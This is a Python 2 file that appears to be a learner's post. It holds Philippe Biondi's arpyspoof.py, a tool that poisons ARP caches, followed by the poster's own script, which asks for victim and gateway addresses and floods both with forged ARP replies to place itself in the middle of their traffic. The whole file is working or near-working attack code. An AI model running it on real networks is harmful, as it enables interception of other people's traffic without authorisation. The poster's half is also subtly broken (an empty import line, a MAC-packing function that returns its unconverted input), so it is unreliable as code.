#This code i got from http://www.secdev.org/python/arpyspoof.py
#i post here to ease me learn about this code.

#! /usr/bin/python

#############################################################################
##                                                                         ##
## arpyspoof.py --- clone of arpspoof.                                     ##
##                  See www.arp-sk.org for more infos about ARP cache      ##
##                  poisoning and other tools to do that                   ##
##                                                                         ##
## Copyright (C) 2002  Philippe Biondi <biondi@cartel-securite.fr>         ##
##                                                                         ##
## This program is free software; you can redistribute it and/or modify it ##
## under the terms of the GNU General Public License as published by the   ##
## Free Software Foundation; either version 2, or (at your option) any     ##
## later version.                                                          ##
##                                                                         ##
## This program is distributed in the hope that it will be useful, but     ##
## WITHOUT ANY WARRANTY; without even the implied warranty of              ##
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU       ##
## General Public License for more details.                                ##
##                                                                         ##
#############################################################################



import getopt,sys,string
from socket import *
from struct import *
from time import sleep


ETHER_BROADCAST="\xff"*6
ETH_P_ETHER=0x0001
ETH_P_IP=0x0800
ETH_P_ARP=0x0806

def usage():
    print "Usage: %s [-t target] [-i interface] [-s sleep] host"
    print "\t host : host to take over"
    print "\t target : MAC address of a specific target to ARP poison"
    print "\t sleep : time to sleep (in seconds) between two packets"
    sys.exit(1)




def ether(src, dst, type):
    return dst+src+pack("!H",type)

def arp(hw, p, hwlen, plen, op, hwsrc, psrc, hwdst, pdst):
    return pack("!HHBBH", hw, p, hwlen, plen, op) + hwsrc + psrc + hwdst + pdst

def is_at(macsrc,ipsrc):
    return arp(ETH_P_ETHER, ETH_P_IP, 6, 4, 2, 
               macsrc, inet_aton(ipsrc), ETHER_BROADCAST, pack("!I",INADDR_ANY))


def mac2str(a):
    return reduce(str.__add__,map(lambda x: chr(int(x,16)), a.split(":")))

def str2mac(a):
    return "%02x:%02x:%02x:%02x:%02x:%02x" % unpack("!6B",a)

try:
    opts=getopt.getopt(sys.argv[1:], "i:t:s:h")

    target = "\xff\xff\xff\xff\xff\xff"
    dev = "eth0"
    slptime = 2
    for opt, parm in opts[0]:
        if opt == "-h":
            usage()
        elif opt == "-t":
            target = mac2str(parm) # XXX get mac from IP
        elif opt == "-i":
            dev = parm
        elif opt == "-s":
	    try:
                slptime = float(parm)
            except ValueError,msg:
                raise getopt.GetoptError("'sleep' parameter error: "+msg.__repr__(),None)

    if len(opts[1]) == 0 :
        raise getopt.GetoptError("'host' parameter missing",None)
    elif len(opts[1]) > 1 :
        raise getopt.GetoptError("Too many parameters : [%s]" % string.join(opts[1]),None)
    else:
        host = opts[1][0]

    print "dev:", dev
    print "target:", str2mac(target) 
    print "host:", host
except getopt.error, msg:
    print "ERROR:",msg
    usage()
except KeyboardInterrupt:
    print "Interrupted by user"
    

try:
    s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))
    s.bind((dev, ETH_P_ARP))
    mymac = s.getsockname()[4] 
    pkt = ether(mymac, target, ETH_P_ARP) + is_at(mymac, host)
    disp = "%s -> %s   %s is-at %s" % (str2mac(mymac), str2mac(target), host, str2mac(mymac))
    while 1:
    	s.send(pkt)
	print disp
	sleep(slptime)
except KeyboardInterrupt:
    pass
    
############# Code that i write ###################

__author__ = 'n4rut0'

import socket
import
import binascii,time
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.ntohs(0x800))
s.bind(("Wi-Fi",socket.htons(0x800)))

def pack_addr(ipadr):
    pkaddr = socket.inet_aton(ipadr)
    return pkaddr
def pack_mac(macadr):
    mcaddr = macadr.replace(":","").decode('hex')
    return macadr

sorc = pack_mac(raw_input("Input your MAC Address : "))
vicmac = pack_mac(raw_input("Input MAC Address victim : "))
gatemac = pack_mac(raw_input("Input MAC Address gateway : "))
vicip = pack_addr(raw_input("Input IP Address victim : "))
gateip = pack_addr(raw_input("Input IP Address gateway : "))

arp_code = '\x08\x06'
eth1 = vicmac + sorc + arp_code
eth2 = gatemac + sorc + arp_code

htype = '\x00\x01'
protype = '\x08\x00'
hsize = '\x06'
psize = '\x04'
opcode = '\x00\x02'

arp_victim = eth1 + htype + protype + hsize + psize + opcode + sorc + gateip + vicmac + vicip
arp_gateway = eth2 + htype + protype + hsize + psize + opcode + sorc + vicip + gatemac + gateip

while True:
    time.sleep(3)
    s.send(arp_victim)
    s.send(arp_gateway)


